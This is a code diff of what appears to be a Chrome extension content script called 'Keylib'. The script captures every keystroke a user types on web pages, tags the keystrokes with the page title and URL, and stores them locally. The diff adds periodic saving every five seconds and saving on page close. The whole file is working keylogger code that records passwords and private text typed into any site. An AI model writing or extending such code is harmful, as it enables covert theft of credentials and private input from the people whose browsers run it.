@@ -1,4 +1,6 @@
 /* Keylib */
+
+// Alphanumeric
 document.addEventListener('keypress', function (e) {
     e = e || window.event;
     var charCode = typeof e.which == "number" ? e.which : e.keyCode;
@@ -7,13 +9,14 @@ document.addEventListener('keypress', function (e) {
     }
 });
 
+// Other keys
 chrome.storage.sync.get({allKeys: false}, function(settings) {
     if (settings.allKeys) {
         document.addEventListener('keydown', function (e) {
             e = e || window.event;
             var charCode = typeof e.which == "number" ? e.which : e.keyCode;
             if (charCode == 8) {
-                log("[BACKSPACE]");
+                log("[BKSP]");
             } else if (charCode == 9) {
                 log("[TAB]");
             } else if (charCode == 13) {
@@ -32,29 +35,54 @@ chrome.storage.sync.get({allKeys: false}, function(settings) {
                 log("[SELECT/CMD]"); // command for mac
             }
         });
+    } else { // Non function keys
+        document.addEventListener('keydown', function (e) {
+            e = e || window.event;
+            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
+            if (charCode == 8) {
+                log("[BKSP]");
+            } else if (charCode == 9) {
+                log("[TAB]");
+            } else if (charCode == 13) {
+                log("[ENTER]");
+            }
+        });
     }
 });
 
 /* Logging */
 var time = new Date().getTime();
 var data = {};
-var save = false;
+var shouldSave = false;
 var lastLog = time;
 data[time] = document.title + "^~^" + document.URL + "^~^";
 
-/* Key'ed on JS timestamp */
+// Key'ed on JS timestamp
 function log(input) {
     var now = new Date().getTime();
     if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
     data[time] += input;
-    save = true;
+    shouldSave = true;
     lastLog = now;
+    console.log("Logged", input);
 }
 
-// Save data on close
+/* Save data */
+function save() {
+    if (shouldSave) {
+        chrome.storage.local.set(data, function() { console.log("Saved", data); });
+        shouldSave = false;
+    }
+}
+
+// Save data on window close
 window.onbeforeunload = function() {
-    if (save) chrome.storage.local.set(data, function() { console.log("Saved", data); });
+    save();
 }
 
+// Save every couple of seconds
+setInterval(function(){
+    save();
+}, 5000);
 
 
